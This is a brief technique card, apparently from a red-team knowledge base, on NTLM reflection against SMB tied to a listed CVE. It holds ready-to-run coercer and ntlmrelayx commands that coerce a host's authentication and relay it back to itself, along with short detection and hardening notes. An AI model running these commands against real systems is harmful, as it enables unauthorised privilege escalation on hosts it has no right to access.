---
id: ntlm_reflection
type: technique
label: "NTLM reflection"
phase: "initial"
tools: ["impacket", "petitpotam"]
cve: "cve-2025-33073"
detect: "Correlate SMB access-control, network-logon, share/endpoint authorization and patch telemetry; do not use loopback or relay patterns as CVE proof."
mitre: "T1557.001"
tag: "new"
---


# NTLM reflection

### Affected object / attribute
**SMB authentication** on the target host.

### Concept (deep)
Reflect an authentication attempt **back to the same host/service** it originated from, gaining the victim’s own privileges without possessing the credential. Requires a coercion loop and a service that accepts its own auth (no signing/EPA). Underpins **CVE-2025-33073** chains.

### Commands
```bash
# ── Coerce + reflect ─────────────────────────────────────────────────
coercer coerce -u user -p pass -t 10.10.10.5 -l 10.10.10.99
ntlmrelayx.py -t smb://10.10.10.5 -smb2support -socks
```

### Detection
**SMB auth where client IP == server IP**; `RestrictNTLM`; SMB signing.

---
